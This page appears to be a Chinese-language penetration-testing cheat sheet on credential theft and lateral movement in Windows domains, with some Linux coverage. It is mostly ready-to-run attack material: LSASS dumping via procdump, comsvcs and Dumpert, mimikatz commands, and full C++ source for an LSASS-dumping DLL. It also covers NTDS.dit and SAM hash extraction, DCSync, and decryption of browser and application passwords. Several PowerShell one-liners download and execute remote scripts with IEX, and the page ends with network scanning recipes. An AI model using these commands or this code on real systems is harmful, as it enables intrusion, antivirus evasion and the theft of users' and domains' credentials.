<h4 id="net-2-0"><a href="#net-2-0" class="headerlink" title=".net 2.0"></a>.net 2.0</h4><pre><code>katz.cs放置C:\Windows\Microsoft.NET\Framework\v2.0.50727
Powershell执行
&gt;$key = &#39;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#39;
&gt;$Content = [System.Convert]::FromBase64String($key)
&gt;Set-Content key.snk -Value $Content –Encoding Byte
Cmd执行
&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs
&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe
</code></pre>
<h4 id="net-4-0-Msbuild"><a href="#net-4-0-Msbuild" class="headerlink" title=".net 4.0 Msbuild"></a>.net 4.0 Msbuild</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild mimi.xml
</code></pre>
<h4 id="JScript"><a href="#JScript" class="headerlink" title="JScript"></a>JScript</h4><pre><code>&gt;wmic os get /format:&quot;mimikatz.xsl&quot;
</code></pre>
<p><img src="314.png" alt="image"></p>
<pre><code>&gt;wmic os get /format:&quot;http://192.168.0.107/ps/mimi.xsl&quot;
</code></pre>
<h4 id="Procdump64-mimikatz"><a href="#Procdump64-mimikatz" class="headerlink" title="Procdump64+mimikatz"></a>Procdump64+mimikatz</h4><pre><code>&gt;procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
&gt;procdump.exe -accepteula -ma lsass.exe lsass.dmp
&gt;mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1&#39;);Invoke-Procdump64 -Args &#39;-accepteula -ma lsass.exe lsass.dmp&#39;&quot;
</code></pre>
<h4 id="Dumpert"><a href="#Dumpert" class="headerlink" title="Dumpert"></a>Dumpert</h4><pre><code>https://github.com/outflanknl/Dumpert
有三种，分别是dll，可执行文件和cs的Aggressor插件，这里测试下dll和exe
DLL的执行方式是
rundll32.exe C:\Outflank-Dumpert.dll,Dump
</code></pre>
<p><img src="653.png" alt="image"></p>
<pre><code>文件保存在c:\windows\temp\dumpert.dmp
用mimikatz
&gt;sekurlsa::mimidump c:\windows\temp\dumpert.dmp
&gt;sekurlsa::logonpasswords
</code></pre>
<p><img src="654.png" alt="image"></p>
<pre><code>可执行文件就直接执行就可以了
</code></pre>
<p><img src="655.png" alt="image"><br><img src="656.png" alt="image"><br><img src="657.png" alt="image"></p>
<h4 id="Cisco-Jabber转储lsass"><a href="#Cisco-Jabber转储lsass" class="headerlink" title="Cisco Jabber转储lsass"></a>Cisco Jabber转储lsass</h4><pre><code>cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
</code></pre>
<h4 id="绕过卡巴斯基"><a href="#绕过卡巴斯基" class="headerlink" title="绕过卡巴斯基"></a>绕过卡巴斯基</h4><pre><code>https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e
</code></pre>
<p><img src="315.png" alt="image"></p>
<pre><code>将三个文件下载到本地，使用visual studio进行编译，需要修改了几个地方。
（1）添加如下代码
#pragma comment(lib, &quot;Rpcrt4.lib&quot;) （引入Rpcrt4.lib库文件）
（2）将.c文件后缀改成.cpp （使用了c++代码，需要更改后缀）
（3) 编译时选择x64
编译得到exe文件
Visual studio创建c++空项目
配置类型选dll
字符集选Unicode，调试器选64位
Dll保存在C:\\windows\\temp\\1.bin
</code></pre>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Dbghelp.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindPID</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(pe32);</span><br><span class="line"></span><br><span class="line">	HANDLE hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;CreateToolhelp32Snapshot Error!&quot;</span> &lt;&lt; endl;;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BOOL bResult = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (bResult)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (_wcsicmp(pe32.szExeFile, <span class="string">L&quot;lsass.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		bResult = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HRESULT</span><span class="params">(WINAPI* _MiniDumpW)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD arg1, DWORD arg2, PWCHAR cmdline)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _RtlAdjustPrivilege)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	ULONG Privilege, BOOL Enable,</span></span></span><br><span class="line"><span class="function"><span class="params">	BOOL CurrentThread, PULONG Enabled)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dump</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	HRESULT             hr;</span><br><span class="line">	_MiniDumpW          MiniDumpW;</span><br><span class="line">	_RtlAdjustPrivilege RtlAdjustPrivilege;</span><br><span class="line">	ULONG               t;</span><br><span class="line"></span><br><span class="line">	MiniDumpW = (_MiniDumpW)<span class="built_in">GetProcAddress</span>(</span><br><span class="line">		<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;comsvcs.dll&quot;</span>), <span class="string">&quot;MiniDumpW&quot;</span>);</span><br><span class="line"></span><br><span class="line">	RtlAdjustPrivilege = (_RtlAdjustPrivilege)<span class="built_in">GetProcAddress</span>(</span><br><span class="line">		<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll&quot;</span>), <span class="string">&quot;RtlAdjustPrivilege&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (MiniDumpW == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// try enable debug privilege</span></span><br><span class="line">	<span class="built_in">RtlAdjustPrivilege</span>(<span class="number">20</span>, TRUE, FALSE, &amp;t);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">wchar_t</span>  ws[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">swprintf</span>(ws, <span class="number">100</span>, <span class="string">L&quot;%hd%hs&quot;</span>, <span class="built_in">FindPID</span>(), <span class="string">&quot; C:\\windows\\temp\\1.bin full&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">MiniDumpW</span>(<span class="number">0</span>, <span class="number">0</span>, ws);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call) &#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		<span class="built_in">dump</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>&gt;xxx.exe c:\xx\xx\xx.dll使用绝对路径
</code></pre>
<h4 id="远程LSASS进程转储-Physmem2profit"><a href="#远程LSASS进程转储-Physmem2profit" class="headerlink" title="远程LSASS进程转储-Physmem2profit"></a>远程LSASS进程转储-Physmem2profit</h4><pre><code>https://github.com/FSecureLABS/physmem2profit
mimikatz被多数安全人员用来获取凭据，但现在的AV/EDR很轻易的识别并查杀，这里不在服务器端使用mimikatz，远程对lsass进程进行转储。
服务器端直接使用visual studio构建
physmem2profit-public\server\
</code></pre>
<p><img src="691.png" alt="image"></p>
<pre><code>客户端
&gt;git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
客户端这里先安装
&gt;bash physmem2profit/client/install.sh
</code></pre>
<p><img src="692.png" alt="image"></p>
<pre><code>需要将此文件
https://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys
传到目标服务器，我这里存放在c:\windows\temp\中
服务器端执行
&gt;Physmem2profit.exe --ip 192.168.0.98 --port 8888 –verbose这里的IP是服务器端IP
</code></pre>
<p><img src="693.png" alt="image"></p>
<pre><code>攻击端安装所需模块
</code></pre>
<p><img src="694.png" alt="image"></p>
<pre><code>攻击端执行
&gt;source physmem2profit/client/.env/bin/activate
&gt;cd physmem2profit/client
&gt;python3 physmem2profit --mode all --host 192.168.0.98 --port 8888 --drive winpmem --install &#39;c:\windows\temp\att_winpmem_64.sys&#39; --label test
</code></pre>
<p><img src="695.png" alt="image"></p>
<pre><code>服务器端可以看到
</code></pre>
<p><img src="696.png" alt="image"></p>
<pre><code>把生成的dmp文件转移到win系统上使用mimikatz即可获得hash，当然也可以在linux上使用pypykatz。
</code></pre>
<p><img src="697.png" alt="image"><br><img src="698.png" alt="image"></p>
<pre><code>再来一条转储lsass进程的命令
要以system权限执行
&gt;rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full
</code></pre>
<p><img src="699.png" alt="image"></p>
<h4 id="SqlDumper-mimikatz"><a href="#SqlDumper-mimikatz" class="headerlink" title="SqlDumper+mimikatz"></a>SqlDumper+mimikatz</h4><pre><code>位置C:\Program Files\Microsoft SQL Server\number\Shared
&gt;tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号
&gt;Sqldumper.exe ProcessID PID 0x01100  导出mdmp文件
&gt;mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
</code></pre>
<h4 id="Mimipenguin"><a href="#Mimipenguin" class="headerlink" title="Mimipenguin"></a>Mimipenguin</h4><pre><code>抓取linux下hash，root权限
https://github.com/huntergregal/mimipenguin
</code></pre>
<h3 id="缓存hash提取"><a href="#缓存hash提取" class="headerlink" title="缓存hash提取"></a>缓存hash提取</h3><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><pre><code>&gt;reg save hklm\sam c:\sam.hive &amp;reg save hklm\system c:\system.hive &amp;reg save hklm\security c:\security.hive
&gt;mimikatz.exe &quot;lsadump::sam /system:sys.hive /sam:sam.hive&quot; exit
</code></pre>
<h4 id="Ninjacopy"><a href="#Ninjacopy" class="headerlink" title="Ninjacopy"></a>Ninjacopy</h4><pre><code>#http://192.168.0.101/powersploit/Exfiltration/Invoke-NinjaCopy.ps1
&gt;powershell -exec bypass
&gt;Import-Module .\invoke-ninjacopy.ps1
&gt;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
&gt;Invoke-NinjaCopy –Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;
&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;dc.zone.com&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;
</code></pre>
<p><img src="316.png" alt="image"></p>
<h4 id="Quarks-pwdump"><a href="#Quarks-pwdump" class="headerlink" title="Quarks-pwdump"></a>Quarks-pwdump</h4><pre><code>&gt;quarks-pwdump.exe –dump-hash-domain
</code></pre>
<h3 id="域hash提取"><a href="#域hash提取" class="headerlink" title="域hash提取"></a>域hash提取</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><pre><code>&gt;ntdsutil
&gt;snapshot
&gt;activate instance ntds
&gt;create
&gt;mount &#123;guid&#125;
&gt;copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit
&gt;unmount &#123;guid&#125;
&gt;delete &#123;guid&#125;
&gt;quit
&amp;
创建
&gt; ntdsutil snapshot “activate instance ntds” create quit quit
挂载
&gt; ntdsutil snapshot “mount &#123;guid&#125;” quit quit
复制
&gt;copy c:\$SNAP_XXX_VOLUMEC$\windows\NTDS\ntds.dit d:\ntds_save.dit
卸载并删除
&gt; ntdsutil snapshot “unmounts &#123;guid&#125;” “delete &#123;guid&#125;” quit quit
删除后检测
&gt; ntdsutil snapshot “List All” quit quit
提取hash
&gt; QuarksPwDump -dump-hash-domain -ntds-file d:\ntds_save.dit
</code></pre>
<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><pre><code>创建C盘卷影拷贝
&gt;vssadmin create shadow /for=c:
复制ntds.dit
&gt;copy &#123;Shadow Copy Volume Name&#125;\windows\NTDS\ntds.dit c:\ntds.dit
删除拷贝
&gt;vssadmin delete shadows /for=c: /quiet
</code></pre>
<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><pre><code>Impacket中的secretsdump.py
#impacket-secretsdump –system SYSTEM –ntds.dit LOCAL
或
#impacket-secretsdump –hashs xxx:xxx –just-dc xxx.com/admin\@192.168.1.1
</code></pre>
<h4 id="NTDSDumpex"><a href="#NTDSDumpex" class="headerlink" title="NTDSDumpex"></a>NTDSDumpex</h4><pre><code>&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;
&gt;reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
https://github.com/zcgonvh/NTDSDumpEx
&gt;NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
</code></pre>
<h4 id="WMI调用Vssadmin"><a href="#WMI调用Vssadmin" class="headerlink" title="WMI调用Vssadmin"></a>WMI调用Vssadmin</h4><pre><code>&gt;wmic /node:dc /user:xxxx\admin /password:passwd process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1&quot;
&gt;wmic /node:dc /user:P xxxx\admin /password: passwd process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2&gt;&amp;1&quot;
&gt;wmic /node:dc /user: xxxx\admin /password: passwd process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2&gt;&amp;1&quot;
&gt;copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
PS C:\Users\test.PENTESTLAB&gt; copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp
</code></pre>
<h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><pre><code>PS &gt;Import-Module .\VolumeShadowCopyTools.ps1
PS &gt;New-VolumeShadowCopy -Volume C:\
PS &gt;Get-VolumeShadowCopy
</code></pre>
<h4 id="Nishang-1"><a href="#Nishang-1" class="headerlink" title="Nishang"></a>Nishang</h4><pre><code>PS &gt;Import-Module .\Copy-VSS.ps1
PS &gt;Copy-VSS
PS &gt;Copy-VSS -DestinationDir C:\ShadowCopy\
或MSF中
Meterpreter&gt;load powershell
Meterpreter&gt;powershell_import /root/Copy-VSS.ps1
Meterpreter&gt;powershell_execute Copy-VSS
</code></pre>
<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>#lsadump::dcsync /domain:xxx.com /all /csv
或
#privilege::debug
#lsadump::lsa /inject
</code></pre>
<h4 id="MSF-5"><a href="#MSF-5" class="headerlink" title="MSF"></a>MSF</h4><pre><code>#use auxiliary/admin/smb/psexec_ntdsgrab
#set rhost smbdomain smbuser smbpass
#exploit
Ntds.dit文件存在/root/.msf4/loot
后渗透模块
#use windows/gather/credentials/domain_hashdump
#set session 1
</code></pre>
<h3 id="laZagne"><a href="#laZagne" class="headerlink" title="laZagne"></a>laZagne</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><pre><code>https://github.com/AlessandroZ/LaZagne
&gt;laZagne.exe all -oN获取所有密码输出到文件
Powershell
PS&gt;[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
PS&gt;$vault = New-Object Windows.Security.Credentials.PasswordVault
PS&gt;$vault.RetrieveAll() | % &#123; $_.RetrievePassword();$_ &#125;
</code></pre>
<h4 id="Linux-4"><a href="#Linux-4" class="headerlink" title="Linux"></a>Linux</h4><pre><code>&gt;python3 laZagne.py all
</code></pre>
<h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><h4 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h4><pre><code>使用Visual studio编译
&gt;Seatbelt.exe ALL获取所有信息
</code></pre>
<h4 id="VNC密码"><a href="#VNC密码" class="headerlink" title="VNC密码"></a>VNC密码</h4><pre><code>&gt;reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v password
http://www.cqure.net/wp/tools/password-recovery/vncpwdump/
解密
&gt;vncpwdump.exe -k hash 
</code></pre>
<h4 id="Navicat信息"><a href="#Navicat信息" class="headerlink" title="Navicat信息"></a>Navicat信息</h4><pre><code>&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host 
&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName 
&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd
离线破解
https://github.com/HyperSine/how-does-navicat-encrypt-password
</code></pre>
<h4 id="Chrome保存的密码"><a href="#Chrome保存的密码" class="headerlink" title="Chrome保存的密码"></a>Chrome保存的密码</h4><pre><code>&gt;mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect
</code></pre>
<h4 id="Foxmail"><a href="#Foxmail" class="headerlink" title="Foxmail"></a>Foxmail</h4><pre><code>X:\Foxmail\storage\xxx\Accounts\Account.rec0
使用
Foxmail Password Decryptor解密
https://securityxploded.com/foxmail-password-decryptor.php
</code></pre>
<h4 id="firefox保存的密码"><a href="#firefox保存的密码" class="headerlink" title="firefox保存的密码"></a>firefox保存的密码</h4><pre><code>https://www.nirsoft.net/password_recovery_tools.html
&gt;webbrowserpassview.exe /LoadPasswordsFirefox 1 /shtml &quot;c:\1.html&quot;
或
&gt;dir %appdata%\Mozilla\Firefox\Profiles\
&gt;dir %appdata%\Mozilla\Firefox\Profiles\yn80ouvt.default
需先结束firefox.exe进程
压缩
&gt;7z.exe -r -padmin123 a c:\users\public\firefox.7z C:\Users\Administrator\AppData\Roaming\Mozilla\*.* 
https://github.com/unode/firefox_decrypt
https://securityxploded.com/firefox-master-password-cracker.php
</code></pre>
<h4 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h4><pre><code>C:\Documents and Settings\Administrator\Application Data\VanDyke下的config文件夹
C:\program files\Vandyke software\securecrt\
https://github.com/uknowsec/SharpDecryptPwd
</code></pre>
<h2 id="横向-2"><a href="#横向-2" class="headerlink" title="横向"></a>横向</h2><h3 id="探测存活主机-1"><a href="#探测存活主机-1" class="headerlink" title="探测存活主机"></a>探测存活主机</h3><h4 id="For-Ping命令查询存活主机"><a href="#For-Ping命令查询存活主机" class="headerlink" title="For+Ping命令查询存活主机"></a>For+Ping命令查询存活主机</h4><pre><code>&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.0.%I |findstr &quot;TTL=&quot;
</code></pre>
<p><img src="317.png" alt="image"></p>
<pre><code>For+Ping命令查询域名对应IP
&gt;for /f &quot;delims=&quot; %i in (D:/domains.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[192.&quot; &gt;&gt; c:/windows/temp/ds.txt
</code></pre>
<h4 id="内外网资产对应"><a href="#内外网资产对应" class="headerlink" title="内外网资产对应"></a>内外网资产对应</h4><pre><code>1.将收集到的子域名保存，使用ping命令在内网循环
for /f &quot;delims=&quot; %i in (host.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; C:/users/public/out.txt
2.找到dns服务器ip，ipconfig或扫描开启53端口的机器
https://github.com/Q2h1Cg/dnsbrute
dnsbrute.exe -domain a.com -dict ziyuming.txt -rate 1000 -retry 1 -server 192.168.1.1:53
3.扫描内网ip开启web服务的title
</code></pre>
<h4 id="NbtScan"><a href="#NbtScan" class="headerlink" title="NbtScan"></a>NbtScan</h4><pre><code>Windows
&gt;nbtscan.exe -m 192.168.1.0/24
Linux
#nbtscan -r 192.168.0.0/24
</code></pre>
<h4 id="NMAP-1"><a href="#NMAP-1" class="headerlink" title="NMAP"></a>NMAP</h4><pre><code>#nmap -Pn -open -A -n -v -iL filename.txt
-Pn：跳过主机发现
-n:不做DNS解析
-open：只显示开启的端口
-A：扫描过程中，输入回车，可以查看扫描进度
-v：显示详细信息
-F：快速扫描100个常见端口
-p:选择要扫描的端口  例： -p1-65535 （全端口扫描，中间没有空格）
-iL：为程序指定一个要扫描的IP列表
-sV：探测开放端口的服务和版本信息
-T可以选择扫描等级，默认T3，但想快点话，可以输入  -T4
存活主机
&gt;nmap -sP -PI 192.168.0.0/24
&gt;nmap -sn -PE -T4 192.168.0.0/24
&gt;nmap -sn -PR 192.168.0.0/24
</code></pre>
<h5 id="代理nmap扫描"><a href="#代理nmap扫描" class="headerlink" title="代理nmap扫描"></a>代理nmap扫描</h5><pre><code>meterpreter &gt; background
msf &gt; use auxiliary/server/socks4a
再配置proxychains.conf
#proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 内网IP
</code></pre>
<h4 id="NetDiscover"><a href="#NetDiscover" class="headerlink" title="NetDiscover"></a>NetDiscover</h4><pre><code>#netdiscover -r 192.168.0.0/24 -i wlan0
</code></pre>
<h4 id="rp-scan"><a href="#rp-scan" class="headerlink" title="rp-scan"></a>rp-scan</h4><pre><code>kali
&gt;arp-scan --interface=wlan0 -localnet
Windows
&gt;arp-scan.exe -t 192.168.0.0/24
</code></pre>
<h4 id="MSF-6"><a href="#MSF-6" class="headerlink" title="MSF"></a>MSF</h4><pre><code>#use auxiliary/scanner/discovery/arp_sweep
</code></pre>
<p><img src="318.png" alt="image"></p>
<pre><code>#use auxiliary/scanner/discovery/udp_sweep
</code></pre>
<p><img src="319.png" alt="image"></p>
<pre><code>#use auxiliary/scanner/netbios/nbname
meterpreter&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.1.1/24
meterpreter&gt;run post/multi/gather/ping_sweep RHOSTS=192.168.1.1/24
</code></pre>
<h3 id="探测服务-amp-端口"><a href="#探测服务-amp-端口" class="headerlink" title="探测服务&amp;端口"></a>探测服务&amp;端口</h3><pre><code>常见端口
</code></pre>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>Mssql</td>
<td>1433</td>
</tr>
<tr>
<td>SMB</td>
<td>445</td>
</tr>
<tr>
<td>WMI</td>
<td>135</td>
</tr>
<tr>
<td>winrm</td>
<td>5985</td>
</tr>
<tr>
<td>rdp</td>
<td>3389</td>
</tr>
<tr>
<td>ssh</td>
<td>22</td>
</tr>
<tr>
<td>oracle</td>
<td>1521</td>
</tr>
<tr>
<td>mysql</td>
<td>3306</td>
</tr>
<tr>
<td>redis</td>
<td>6379</td>
</tr>
<tr>
<td>postgresql</td>
<td>5432</td>
</tr>
<tr>
<td>ldap</td>
<td>389</td>
</tr>
<tr>
<td>smtp</td>
<td>25</td>
</tr>
<tr>
<td>pop3</td>
<td>110</td>
</tr>
<tr>
<td>imap</td>
<td>143</td>
</tr>
<tr>
<td>exchange</td>
<td>443</td>
</tr>
<tr>
<td>vnc</td>
<td>5900</td>
</tr>
<tr>
<td>ftp</td>
<td>21</td>
</tr>
<tr>
<td>rsync</td>
<td>873</td>
</tr>
<tr>
<td>mongodb</td>
<td>27017</td>
</tr>
<tr>
<td>telnet</td>
<td>23</td>
</tr>
<tr>
<td>svn</td>
<td>3690</td>
</tr>
<tr>
<td>java rmi</td>
<td>1099</td>
</tr>
<tr>
<td>couchdb</td>
<td>5984</td>
</tr>
<tr>
<td>pcanywhere</td>
<td>5632</td>
</tr>
<tr>
<td>web</td>
<td>80-90,8000-10000,7001,9200,9300</td>
</tr>
</tbody></table>
<h4 id="Powershell-3"><a href="#Powershell-3" class="headerlink" title="Powershell"></a>Powershell</h4><h5 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Recon/Invoke-Portscan.ps1&#39;); Invoke-Portscan -Hosts 192.168.0.0/24 –T 4 -Ports &#39;1-65535&#39; -oA C:\TEMP.txt&quot;
</code></pre>
<h5 id="Nishang-2"><a href="#Nishang-2" class="headerlink" title="Nishang"></a>Nishang</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Scan/Invoke-PortScan.ps1&#39;); Invoke-Portscan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort&quot;
</code></pre>
<p><img src="320.png" alt="image"></p>
<pre><code>去掉scanport就是探测存活
</code></pre>
